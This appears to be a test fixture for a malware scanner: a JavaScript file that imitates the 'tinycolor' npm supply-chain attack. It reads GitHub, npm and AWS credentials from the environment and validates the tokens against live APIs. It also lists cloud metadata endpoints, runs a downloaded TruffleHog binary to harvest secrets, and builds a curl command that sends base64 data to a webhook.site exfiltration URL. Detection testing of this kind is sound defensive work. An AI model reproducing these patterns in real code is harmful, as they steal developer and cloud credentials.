// Malicious bundle.js file simulating the tinycolor attack
// This file contains patterns that should be detected by the scanner

const { execSync } = require("child_process");
const os = require("os");

function trufflehogUrl() {
  const plat = os.platform();
  if (plat === "win32") return "https://github.com/trufflesecurity/trufflehog/releases/download/v3.63.4/trufflehog_windows_x86_64.zip";
  if (plat === "linux") return "https://github.com/trufflesecurity/trufflehog/releases/download/v3.63.4/trufflehog_linux_x86_64.tar.gz";
  return "https://github.com/trufflesecurity/trufflehog/releases/download/v3.63.4/trufflehog_darwin_all.tar.gz";
}

function runScanner(binaryPath, targetDir) {
  // Executes downloaded scanner against local paths
  const cmd = `"${binaryPath}" filesystem "${targetDir}" --json`;
  const out = execSync(cmd, { stdio: "pipe" }).toString();
  return JSON.parse(out); // Parsed findings contain tokens and secrets
}

// Cloud metadata discovery
const imdsV4 = "http://169.254.169.254";
const imdsV6 = "http://[fd00:ec2::254]";
const gcpMeta = "http://metadata.google.internal";

// Environment variable access
const githubToken = process.env.GITHUB_TOKEN;
const npmToken = process.env.NPM_TOKEN;
const awsKey = process.env.AWS_ACCESS_KEY_ID;
const awsSecret = process.env.AWS_SECRET_ACCESS_KEY;

// NPM token validation
fetch("https://registry.npmjs.org/-/whoami", {
  headers: { "Authorization": `Bearer ${process.env.NPM_TOKEN}` }
});

// GitHub API use if GITHUB_TOKEN is present
fetch("https://api.github.com/user", {
  headers: { "Authorization": `token ${process.env.GITHUB_TOKEN}` }
});

// Webhook exfiltration endpoint
const webhookUrl = "https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7";

// Base64 data exfiltration
const findings = "sensitive data";
const encodedData = Buffer.from(findings).toString('base64');
const curlCommand = `curl -s -X POST -d "${encodedData}" "${webhookUrl}"`;

console.log("Malicious bundle.js loaded - this should be detected!");
